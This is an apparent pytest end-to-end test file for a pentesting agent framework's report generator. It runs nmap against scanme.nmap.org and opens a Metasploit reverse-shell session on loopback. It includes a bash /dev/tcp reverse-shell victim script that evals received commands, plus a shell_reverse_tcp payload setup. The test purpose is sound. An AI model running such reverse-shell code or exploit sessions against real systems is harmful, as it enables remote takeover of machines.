"""Opt-in end-to-end tests for the engagement report layer.

Gated behind ``NEXUS_E2E=1``. The first test needs live network access to the
authorised ``scanme.nmap.org`` and the ``nmap`` binary; the second needs a
reachable ``msfrpcd`` and keeps everything on loopback (the same bash
``/dev/tcp`` victim the session E2E uses).

Both drive the *real* REPL path (``OmniSession.invoke_tool``), which persists
each ``ToolResult`` to the durable conversation exactly like the agent loop, so
the extractor reads genuine records — the report never invents a finding.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import shutil
import socket
import subprocess
import threading
import time
from datetime import datetime, timedelta, timezone
from html.parser import HTMLParser
from pathlib import Path

from dotenv import load_dotenv
import pytest

ROOT = Path(__file__).resolve().parents[3]
ENABLED = os.getenv("NEXUS_E2E") == "1"
if ENABLED:
    load_dotenv(ROOT / ".env", override=False)

from nexus_core.cli.session import OmniSession  # noqa: E402 - after dotenv
from nexus_core.integrations.metasploit.client import (  # noqa: E402
    MetasploitClient,
    MetasploitConfig,
    MetasploitError,
    MetasploitUnavailable,
)
from nexus_core.kernel.control_store import ControlStore  # noqa: E402
from nexus_core.scope import EngagementScope, EngagementStore  # noqa: E402

pytestmark = pytest.mark.skipif(
    not ENABLED, reason="set NEXUS_E2E=1 to run the live report tests"
)

SCANME_HOST = "scanme.nmap.org"
SCANME_IPV4 = "45.33.32.156"
SCANME_IPV6 = "2600:3c01::f03c:91ff:fe18:bb2f"
LOOPBACK = "127.0.0.1"

REPORT_TOOL = "nexus.report.generate"
MARKDOWN_SECTIONS = (
    "# Reporte de Pentesting",
    "## Resumen ejecutivo",
    "## Alcance",
    "## Metodología",
    "## Hallazgos",
    "## Intentos fallidos",
    "## Cronología",
    "## Chain of custody",
    "## Anexos",
)


def _iso(delta: timedelta) -> str:
    return (datetime.now(timezone.utc) + delta).isoformat()


def _scope(engagement_id: str, *, cidrs, domains=()) -> EngagementScope:
    return EngagementScope(
        engagement_id=engagement_id,
        tenant_id="system",
        name=engagement_id,
        client="nexus-e2e",
        owner_id="owner-1",
        valid_from=_iso(-timedelta(days=1)),
        valid_until=_iso(timedelta(days=1)),
        cidrs=tuple(cidrs),
        domains=tuple(domains),
        urls=(),
        exclusions=(),
        created_at=_iso(timedelta(0)),
    )


def _session(tmp_path, engagement: EngagementScope) -> OmniSession:
    """A REPL session with trust mode so HIGH-risk tools are durably approved."""
    store = ControlStore(tmp_path / "report-e2e.db")
    store.initialize()
    EngagementStore(store).create(engagement)
    return OmniSession(
        store=store,
        tenant_id="system",
        engagement=engagement,
        llm_client=None,
        operator_id="operator:e2e",
        trust_mode=True,
    )


def _tool_result(session: OmniSession, tool_id: str, arguments: dict) -> dict:
    """Invoke one tool through the REPL; unwrap the ToolResult and assert success."""
    result = session.invoke_tool(tool_id, arguments)
    assert result is not None, f"{tool_id} was not invoked"
    tool_result = result["output"]
    assert tool_result["verified"] is True, f"{tool_id}: {tool_result['verification_method']}"
    return tool_result


class _HTMLCollector(HTMLParser):
    parts = ("html", "head", "body", "title", "style", "div", "table", "details")

    def __init__(self) -> None:
        super().__init__()
        self.seen: list[str] = []
        self.title = ""
        self._in_title = False

    def handle_starttag(self, tag, attrs):
        self.seen.append(tag)
        if tag == "title":
            self._in_title = True

    def handle_endtag(self, tag):
        if tag == "title":
            self._in_title = False

    def handle_data(self, data):
        if self._in_title:
            self.title += data


def _nuclei_ready() -> bool:
    if shutil.which("nuclei") is None:
        return False
    templates = Path(os.getenv("NEXUS_NUCLEI_TEMPLATES") or "/opt/nuclei-templates")
    return templates.is_dir() and next(iter(templates.rglob("*.yaml")), None) is not None


# ------------------------------------------------------------------ test 1
@pytest.mark.skipif(shutil.which("nmap") is None, reason="nmap binary is not installed")
def test_e2e_full_report_from_real_engagement(tmp_path):
    """A real nmap (+nuclei) run yields a verifiable Markdown/HTML/JSON report."""
    engagement = _scope(
        "eng-scanme",
        cidrs=(f"{SCANME_IPV4}/32", f"{SCANME_IPV6}/128"),
        domains=(SCANME_HOST,),
    )
    session = _session(tmp_path, engagement)

    nmap = _tool_result(
        session, "nexus.recon.nmap", {"target": SCANME_HOST, "ports": "22,80"}
    )
    assert nmap["evidence"]["hosts_up"] >= 1

    if _nuclei_ready():
        session.invoke_tool(
            "nexus.web.nuclei",
            {
                "targets": [f"http://{SCANME_HOST}"],
                "templates": ["http/technologies/tech-detect.yaml"],
                "tags": ["tech"],
                "timeout_seconds": 180,
            },
        )

    report = _tool_result(
        session, REPORT_TOOL, {"engagement_id": "eng-scanme", "format": "both"}
    )
    output, evidence = report["output"], report["evidence"]

    assert evidence["audit_chain_valid"] is True
    assert output["findings_count"] >= 1
    assert output["report_sha256"] and len(output["report_sha256"]) == 64
    assert "nexus.recon.nmap" in output["tools_used"]

    markdown = Path(output["report_path_md"]).read_text(encoding="utf-8")
    for section in MARKDOWN_SECTIONS:
        assert section in markdown, f"missing section: {section}"

    html = Path(output["report_path_html"]).read_text(encoding="utf-8")
    assert html.startswith("<!DOCTYPE html>")
    parser = _HTMLCollector()
    parser.feed(html)
    assert {"html", "head", "body", "style"} <= set(parser.seen)
    assert parser.title
    assert "<script" not in html.lower()
    assert 'href="http' not in html and 'src="http' not in html  # self-contained

    # Chain of custody: every deliverable is content-addressed.
    for name, digest in evidence["artifact_sha256"].items():
        body = Path(output["directory"], name).read_bytes()
        assert digest == hashlib.sha256(body).hexdigest()

    payload = json.loads(Path(output["report_path_json"]).read_text(encoding="utf-8"))
    assert payload["schema"] == "nexus.engagement_report/1"
    assert payload["engagement_id"] == "eng-scanme"
    assert payload["findings"] and payload["audit_chain_valid"] is True
    # Findings carry evidence, and the evidence carries hashes.
    assert all(finding["evidence"] for finding in payload["findings"])
    assert any(
        item.get("sha256") for finding in payload["findings"] for item in finding["evidence"]
    )


# ------------------------------------------------------------------ test 2
LOOPBACK_HANDLER = "exploit/multi/handler"
LOOPBACK_PAYLOAD = "linux/x64/shell_reverse_tcp"
VICTIM_SCRIPT = (
    "until exec 3<>/dev/tcp/{host}/{port}; do sleep 0.5; done\n"
    'while IFS= read -r line <&3; do eval "$line" >&3 2>&1; done\n'
)
MSF_READY = bool(os.getenv("MSF_RPC_PASSWORD"))


def _free_port() -> int:
    with socket.socket() as probe:
        probe.bind((LOOPBACK, 0))
        return int(probe.getsockname()[1])


def _spawn_victim(port: int) -> subprocess.Popen:
    return subprocess.Popen(
        ["/bin/bash", "-c", VICTIM_SCRIPT.format(host=LOOPBACK, port=port)],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def _daemon_reachable() -> bool:
    async def check() -> bool:
        async with MetasploitClient(MetasploitConfig.from_env()) as client:
            return await client.is_available()

    try:
        return asyncio.run(check())
    except (MetasploitUnavailable, MetasploitError):
        return False


@pytest.mark.skipif(not MSF_READY, reason="requires MSF_RPC_PASSWORD")
def test_e2e_report_with_msf_session(tmp_path, monkeypatch):
    """An exploit-opened session and a command run in it become report findings."""
    if not _daemon_reachable():
        pytest.skip("msfrpcd is not reachable")
    if shutil.which("bash") is None:
        pytest.skip("bash is not available")

    port = _free_port()
    monkeypatch.setenv("MSF_LHOST", LOOPBACK)
    monkeypatch.setenv("MSF_LPORT", str(port))

    engagement = _scope("eng-loopback", cidrs=(f"{LOOPBACK}/32",))
    session = _session(tmp_path, engagement)

    # The victim retries until the handler binds, so a fixed lead-in is enough.
    victim = None

    def launch_victim() -> None:
        nonlocal victim
        time.sleep(3)
        victim = _spawn_victim(port)

    thread = threading.Thread(target=launch_victim, daemon=True)
    thread.start()

    opened_uuid = None
    try:
        exploit = _tool_result(
            session,
            "nexus.exploit.msf_exploit",
            {
                "module": LOOPBACK_HANDLER,
                "target": LOOPBACK,
                "payload": LOOPBACK_PAYLOAD,
                "options": {"AutoVerifySession": "false"},
                "timeout_seconds": 30,
            },
        )
        assert exploit["output"]["status"] == "session_opened"
        opened_uuid = exploit["output"]["session"]["uuid"]

        # Attach the REPL to the real session and run one command through it.
        session.active_session_uuid = opened_uuid
        session.run_session_command("id")

        report = _tool_result(
            session, REPORT_TOOL, {"engagement_id": "eng-loopback", "format": "both"}
        )
        output = report["output"]

        markdown = Path(output["report_path_md"]).read_text(encoding="utf-8")
        assert "Acceso obtenido vía" in markdown
        assert "Comando ejecutado en sesión: id" in markdown
        assert "uid=" in markdown
        assert output["sessions_opened"] >= 1

        payload = json.loads(Path(output["report_path_json"]).read_text(encoding="utf-8"))
        kinds = {finding["kind"] for finding in payload["findings"]}
        assert "session_opened" in kinds
        assert "session_command" in kinds
    finally:
        thread.join(timeout=35)
        if opened_uuid:
            async def stop() -> None:
                async with MetasploitClient(MetasploitConfig.from_env()) as client:
                    try:
                        await client.stop_session(opened_uuid)
                    except MetasploitError:
                        pass

            try:
                asyncio.run(stop())
            except MetasploitError:  # pragma: no cover - best effort cleanup
                pass
        if victim is not None and victim.returncode is None:
            victim.kill()
            victim.wait(timeout=5)
